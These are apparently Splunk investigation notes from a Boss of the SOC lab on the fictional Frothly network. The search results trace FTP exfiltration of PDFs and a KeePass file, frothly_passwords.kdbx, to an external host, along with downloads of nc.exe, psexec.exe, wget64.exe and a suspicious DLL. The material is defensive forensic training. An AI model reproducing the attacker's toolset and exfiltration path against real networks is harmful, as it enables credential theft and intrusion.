## index="botsv*" subject="A handle to an object was requested" | stats count by Security_ID
| Security_ID | count |
| :--- | :--- |
| FROTHLY\mallory.kraeusen | 195 |
| NT AUTHORITY\SYSTEM | 375 |
| FROTHLY\Administrator | 310 |
| FROTHLY\service3 | 4 |



##  index="botsv*" sourcetype="stream:ftp"
### index="botsv*" sourcetype="stream:ftp" loadway=Upload "*.pdf" | stats count by src_ip,dest_ip
| src_ip | dest_ip | count |
| -      | -       | -     |
| 10.0.2.107 | 160.153.91.7 | 710 |

### index="botsv*" sourcetype="stream:ftp" loadway=Upload NOT "*.pdf" | stats count by src_ip,dest_ip,filename
| src_ip | dest_ip | filename | count |
| -      |    -    |    -     |   -   |
| 10.0.2.109 | 160.153.91.7 | frothly_passwords.kdbx | 1 |

### index="botsv*" sourcetype="stream:ftp" loadway=Download | stats count by src_ip,dest_ip,filename
| src_ip     | dest_ip      | filename                                   | count |
|------------|--------------|--------------------------------------------|--------|
| 10.0.2.107 | 160.153.91.7 | dns.py                                     | 1      |
| 10.0.2.107 | 160.153.91.7 | nc.exe                                     | 1      |
| 10.0.2.107 | 160.153.91.7 | psexec.exe                                 | 1      |
| 10.0.2.107 | 160.153.91.7 | python-2.7.6.amd64.msi                      | 1      |
| 10.0.2.107 | 160.153.91.7 | wget64.exe                                 | 1      |
| 10.0.2.107 | 160.153.91.7 | winsys64.dll                               | 1      |
| 10.0.2.107 | 160.153.91.7 | 나는_데이비드를_사랑한다.hwp                | 1      |
| 10.0.2.109 | 160.153.91.7 | dns.py                                     | 1      |
| 10.0.2.109 | 160.153.91.7 | nc.exe                                     | 1      |
| 10.0.2.109 | 160.153.91.7 | psexec.exe                                 | 1      |
| 10.0.2.109 | 160.153.91.7 | python-2.7.6.amd64.msi                      | 1      |
| 10.0.2.109 | 160.153.91.7 | wget64.exe                                 | 1      |
| 10.0.2.109 | 160.153.91.7 | winsys64.dll                               | 1      |
| 10.0.2.109 | 160.153.91.7 | 나는_데이비드를_사랑한다.hwp                | 1      |





## index="botsv*" "160.153.91.7"
### index="botsv*" "160.153.91.7" | stats count by src_ip,dest_ip
| src_ip       | dest_ip      | count |
|--------------|--------------|-------|
| 10.0.1.100   | 160.153.91.7 | 3     |
| 10.0.1.100   | 8.8.8.8      | 9     |
| 10.0.1.101   | 160.153.91.7 | 3     |
| 10.0.1.101   | 4.4.4.4      | 1     |
| 10.0.2.107   | 10.0.1.100   | 8     |
| 10.0.2.107   | 160.153.91.7 | 1479  |
| 10.0.2.109   | 10.0.1.100   | 4     |
| 10.0.2.109   | 160.153.91.7 | 41    |
| 71.39.18.125 | 160.153.91.7 | 2     |
| 160.153.91.7 | 10.0.2.107   | 2144  |
| 160.153.91.7 | 10.0.2.109   | 27    |
| 160.153.91.7 | 71.39.18.125 | 1450  |
